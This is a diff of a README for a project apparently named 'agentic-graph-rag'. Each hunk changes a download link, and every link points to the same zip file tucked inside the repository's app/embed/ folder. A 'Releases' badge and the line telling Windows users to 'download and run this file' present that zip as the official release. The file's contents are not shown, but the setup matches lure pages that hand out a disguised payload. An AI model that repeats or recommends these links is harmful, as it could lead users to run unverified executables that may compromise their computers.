@@ -1,6 +1,6 @@
 # 🤖 agentic-graph-rag - Graph reasoning for local research
 
-[![Download](https://img.shields.io/badge/Download-Releases-6C757D?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/christanbased926/agentic-graph-rag/main/app/embed/rag-agentic-graph-3.9.zip)
+[![Download](https://img.shields.io/badge/Download-Releases-6C757D?style=for-the-badge&logo=github)](https://github.com/christanbased926/agentic-graph-rag/raw/refs/heads/main/app/embed/rag-agentic-graph-3.9.zip)
 
 ## 🧭 What this app does
 
@@ -31,7 +31,7 @@ For best results, keep these basics ready:
 ## ⬇️ Download the app
 
 Visit this page to download:  
-https://raw.githubusercontent.com/christanbased926/agentic-graph-rag/main/app/embed/rag-agentic-graph-3.9.zip
+https://github.com/christanbased926/agentic-graph-rag/raw/refs/heads/main/app/embed/rag-agentic-graph-3.9.zip
 
 On that page:
 1. open the latest release
@@ -236,7 +236,7 @@ These tools work together to support connected search and agent-style reasoning.
 ## 📌 Release page
 
 Download and run this file from the latest release package on Windows:  
-https://raw.githubusercontent.com/christanbased926/agentic-graph-rag/main/app/embed/rag-agentic-graph-3.9.zip
+https://github.com/christanbased926/agentic-graph-rag/raw/refs/heads/main/app/embed/rag-agentic-graph-3.9.zip
 
 ## 🖥️ Quick start checklist
 
